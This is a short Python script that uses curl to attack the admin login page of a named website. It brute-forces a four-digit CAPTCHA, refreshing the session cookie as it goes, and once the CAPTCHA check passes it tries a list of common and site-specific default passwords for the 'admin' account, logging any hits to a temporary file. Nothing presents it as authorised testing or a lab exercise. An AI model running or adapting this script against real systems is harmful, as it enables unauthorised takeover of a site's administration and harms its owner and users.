import subprocess, time

URL = "http://yurundianqi.com"
LOGIN = "/admin.php?s=/Login/login"
COOKIE = "/tmp/yb.txt"

PASSWORDS = ["admin","123456","admin123","admin888","12345678","password","888888","admin@123","yurundianqi","yurun","root","sa","administrator"]

found = False
for i in range(10000):
    cv = f"{i:04d}"
    try:
        if i % 20 == 0:
            subprocess.run(["curl","-sk","--connect-timeout","8",f"{URL}/admin.php","-c",COOKIE,"-b",COOKIE,"-o","/dev/null"],timeout=10)
            subprocess.run(["curl","-sk","--connect-timeout","8",f"{URL}/admin.php?s=/Login/verify/id/a_login_1","-b",COOKIE,"-o","/dev/null"],timeout=10)
        r = subprocess.run(["curl","-sk","-L","--connect-timeout","6","--max-time","8",f"{URL}{LOGIN}","-X","POST","-d",f"username=admin&password=admin&code={cv}","-b",COOKIE],capture_output=True,text=True,timeout=10)
        if "验证码不正确" not in r.stdout:
            with open("/tmp/YB_HIT.txt","w") as f:
                f.write(f"code={cv} resp={r.stdout[:500]}\n")
            for pw in PASSWORDS:
                r2 = subprocess.run(["curl","-sk","-L",f"{URL}{LOGIN}","-X","POST","-d",f"username=admin&password={pw}&code={cv}","-b",COOKIE],capture_output=True,text=True,timeout=8)
                with open("/tmp/YB_HIT.txt","a") as f:
                    f.write(f"  pw={pw}: {r2.stdout[:200]}\n")
            found = True
            break
    except: pass
    if i % 500 == 0: print(f"[{i}/10000]",flush=True)
print(f"DONE: {'FOUND '+str(cv) if found else 'NOT FOUND'}")
